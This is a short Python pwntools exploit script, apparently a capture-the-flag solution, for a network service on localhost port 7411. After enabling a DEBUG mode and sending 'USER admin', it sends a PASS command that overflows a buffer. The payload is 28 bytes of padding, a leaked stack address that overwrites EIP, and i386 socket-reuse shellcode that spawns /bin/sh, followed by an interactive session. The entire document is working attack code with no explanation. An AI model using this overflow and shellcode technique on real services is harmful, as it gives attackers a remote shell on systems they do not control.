from pwn import *
# initial configuration
context(os="linux", arch="i386")
host = "localhost"
port = "7411"
# offset, junk to get to the EIP
junk = "A" * 28
# userpass leaked memory address
memory_add = p32(0xffffc440+32)
# socket reuse shell code 
buf = ""
buf += "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf += "\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf += "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf += "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf += "\x89\xe3\x31\xc9\xcd\x80"
# connection
p = remote(host,port)
p.recvuntil("OK Ready. Send USER command.")
p.sendline("DEBUG")
p.recvuntil("OK DEBUG mode on.")
p.sendline("USER admin")
p.recvuntil("OK Send PASS command.")
p.sendline("PASS " + junk + memory_add +  buf)
p.interactive()
